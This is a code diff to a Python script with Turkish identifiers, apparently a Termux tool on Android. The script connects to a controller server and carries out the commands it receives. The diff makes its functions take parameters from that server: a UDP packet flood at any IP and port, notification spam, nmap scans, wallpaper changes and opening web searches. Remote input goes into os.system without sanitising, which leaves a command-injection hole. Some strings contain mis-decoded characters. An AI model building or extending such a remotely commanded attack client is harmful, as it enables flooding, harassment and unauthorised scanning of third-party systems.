@@ -4,19 +4,17 @@ import os
 import time
 import threading
 
-def bildirim_spam():
-    for i in range(10):
-        os.system(f'termux-notification --title "Fsociety" --content "Bildirim {i+1}"')
-        time.sleep(0.5)
+def bildirim_gonder(baslik, icerik):
+    os.system(f'termux-notification --title "{baslik}" --content "{icerik}"')
 
-def udp_spam():
-    import socket
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    hedef_ip = "192.168.1.100"
-    hedef_port = 80
-    mesaj = b"Fsociety UDP Spam"
-    for _ in range(100):
-        sock.sendto(mesaj, (hedef_ip, hedef_port))
+def udp_yolla(ip, port, mesaj):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        for _ in range(100):
+            sock.sendto(mesaj.encode(), (ip, int(port)))
+        return "[âœ“] UDP paketleri gÃ¶nderildi."
+    except Exception as e:
+        return f"[X] UDP hatasÄ±: {str(e)}"
 
 def arka_plan_degistir(dosya_adi):
     tam_yol = f"/sdcard/Download/{dosya_adi}"
@@ -40,6 +38,14 @@ def nmap_tara(ip):
     except Exception as e:
         return f"[X] Nmap hatasÄ±: {str(e)}"
 
+def google_ara(aranacak):
+    try:
+        url = f"https://www.google.com/search?q={aranacak.replace(' ', '+')}"
+        os.system(f'am start -a android.intent.action.VIEW -d "{url}"')
+        return "[âœ“] Google aramasÄ± aÃ§Ä±ldÄ±."
+    except:
+        return "[X] Google aÃ§Ä±lamadÄ±."
+
 host = input("Sunucu IP >> ")
 port = int(input("Port >> "))
 
@@ -52,12 +58,25 @@ while True:
         komut = s.recv(1024).decode().strip()
         if komut == "exit":
             break
-        elif komut == "bildirim-spam":
-            bildirim_spam()
-            s.send("[âœ“] Bildirim spam gÃ¶nderildi.".encode())
-        elif komut == "udp-spam":
-            udp_spam()
-            s.send("[âœ“] UDP paketleri gÃ¶nderildi.".encode())
+        elif komut.startswith("bildirim-spam "):
+            try:
+                parcalar = komut.split('"')
+                baslik = parcalar[1]
+                icerik = parcalar[3]
+                bildirim_gonder(baslik, icerik)
+                s.send("[âœ“] Bildirim gÃ¶nderildi.".encode())
+            except:
+                s.send("[X] HatalÄ± bildirim komutu. Ã–rnek: bildirim-spam \"BaÅŸlÄ±k\" \"Ä°Ã§erik\"".encode())
+        elif komut.startswith("udp-spam "):
+            try:
+                parcalar = komut.split(" ")
+                hedef_ip = parcalar[1]
+                hedef_port = parcalar[2]
+                mesaj = " ".join(parcalar[3:])
+                sonuc = udp_yolla(hedef_ip, hedef_port, mesaj)
+                s.send(sonuc.encode())
+            except:
+                s.send("[X] HatalÄ± UDP komutu. Ã–rnek: udp-spam 192.168.1.5 80 mesaj".encode())
         elif komut.startswith("arka-plan "):
             dosya_adi = komut.split(" ", 1)[1]
             arka_plan_degistir(dosya_adi)
@@ -68,6 +87,10 @@ while True:
         elif komut.startswith("nmap "):
             hedef_ip = komut.split(" ", 1)[1]
             sonuc = nmap_tara(hedef_ip)
+            s.send(sonuc.encode())
+        elif komut.startswith("google "):
+            arama = komut.split(" ", 1)[1]
+            sonuc = google_ara(arama)
             s.send(sonuc.encode())
         else:
             s.send("[X] Bilinmeyen komut.".encode())
